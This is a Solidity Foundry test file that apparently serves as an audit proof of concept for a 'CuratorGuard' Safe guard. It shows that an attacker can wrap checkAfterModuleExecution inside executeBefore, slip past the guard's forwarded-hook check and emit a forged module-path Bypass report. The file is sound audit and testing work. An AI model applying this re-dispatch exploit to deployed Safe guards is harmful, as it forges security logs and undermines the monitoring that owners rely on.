// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {Vm} from "forge-std/Vm.sol";
import {Safe as Safe150} from "safe-contracts-v1.5.0/contracts/Safe.sol";
import {SafeProxy as SafeProxy150} from "safe-contracts-v1.5.0/contracts/proxies/SafeProxy.sol";

import {CuratorGuard} from "contracts/guards/CuratorGuard.sol";
import {ISafe} from "contracts/interfaces/safe/ISafe.sol";
import {Operation} from "contracts/interfaces/safe/ISafeGuard.sol";
import {CuratorGuardHarness, MockProtocol} from "test/guards/CuratorGuardTestBase.sol";
import {SafeTxHelper} from "test/guards/SafeTxHelper.sol";

/// @title G9a-1 on the module path (real Safe v1.5.0): the same `executeBefore` re-dispatch forges a
///        path-1 `TransactionChecked` through a Safe whose fallback handler is the guard.
contract G9a_ForwardedExecuteBeforeModuleTest is SafeTxHelper {
    CuratorGuard internal guard;
    MockProtocol internal protocol;
    address internal vetro = makeAddr("vetro");
    address internal council = makeAddr("council");
    address internal attacker = makeAddr("attacker");
    address internal curator;
    bytes32 internal constant FORGED = keccak256("no module transaction ever carried this hash");
    bytes32 internal constant REPORT_SIG = keccak256("TransactionChecked(address,bytes32,uint8,uint8)");

    function setUp() public {
        vm.warp(1_700_000_000);
        (curator, signerPk) = makeAddrAndKey("curator");
        Safe150 _singleton = new Safe150();
        SafeProxy150 _proxy = new SafeProxy150(address(_singleton));
        address[] memory _owners = new address[](1);
        _owners[0] = curator;
        Safe150(payable(address(_proxy))).setup(_owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)));
        safe = ISafe(address(_proxy));
        guard = new CuratorGuardHarness(0, vetro, council);
        CuratorGuardHarness(address(guard)).seedSafe(address(safe));
        protocol = new MockProtocol();
        vm.startPrank(address(safe));
        safe.setGuard(address(guard));
        safe.setModuleGuard(address(guard));
        // V2-89's precondition: the guard in the handler slot (a paste error in an approved
        // `setFallbackHandler`, a pre-install signer action, or a self-call inside an admin window).
        (bool _ok, ) = address(safe).call(abi.encodeWithSignature("setFallbackHandler(address)", address(guard)));
        assertTrue(_ok);
        vm.stopPrank();
        vm.prank(vetro);
        guard.enforce(address(safe));
    }

    function test_poc_forwarded_executeBefore_forges_a_module_path_bypass_report() public {
        vm.prank(council);
        guard.bypass(address(safe), 1 hours);
        bytes memory _after = abi.encodeCall(guard.checkAfterModuleExecution, (FORGED, true));

        // Direct forwarding: refused (V2-89 holds).
        vm.prank(attacker);
        (bool _ok, bytes memory _ret) = address(safe).call(_after);
        assertFalse(_ok);
        assertEq(bytes4(_ret), CuratorGuard.ForwardedHookCall.selector);

        // Wrapped in `executeBefore`: accepted, a path-1 Bypass report under the stranger's hash.
        vm.recordLogs();
        vm.prank(attacker);
        (_ok, ) = address(safe).call(abi.encodeCall(guard.executeBefore, (uint64(block.timestamp + 1 hours), _after)));
        assertTrue(_ok, "forwarded executeBefore(checkAfterModuleExecution) accepted");
        Vm.Log[] memory _logs = vm.getRecordedLogs();
        uint256 _count;
        for (uint256 i; i < _logs.length; ++i) {
            if (_logs[i].emitter != address(guard) || _logs[i].topics[0] != REPORT_SIG) continue;
            ++_count;
            assertEq(_logs[i].topics[1], bytes32(uint256(uint160(address(safe)))));
            assertEq(_logs[i].topics[2], FORGED);
            assertEq(uint256(_logs[i].topics[3]), uint256(CuratorGuard.Outcome.Bypass));
            assertEq(abi.decode(_logs[i].data, (uint256)), 1, "module path");
        }
        assertEq(_count, 1, "one forged module-path report");
    }
}
